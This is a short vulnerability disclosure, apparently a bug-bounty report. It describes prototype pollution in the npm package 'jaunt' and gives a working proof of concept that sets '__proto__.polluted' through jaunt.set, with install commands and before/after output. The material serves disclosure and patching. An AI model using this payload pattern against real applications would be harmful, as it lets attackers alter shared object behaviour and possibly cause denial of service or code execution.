# Description

`jaunt` is a package to Get or set a value in an object/array using a dot-delimited string or array of keys. 
This package is vulnerable to `Prototype Pollution`.
This package fails to restrict access to prototypes of objects, allowing for modification of prototype behavior using a `proto` payload, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var jaunt = require("jaunt")
var obj = {}
console.log("Before : " + obj.polluted);
jaunt.set(obj, '__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);

```
2. Execute the following commands in another terminal:

```bash
npm i jaunt # Install affected module
node poc.js #  Run the PoC
```
3. Check the Output:
```
Before : undefined
After : yes
```
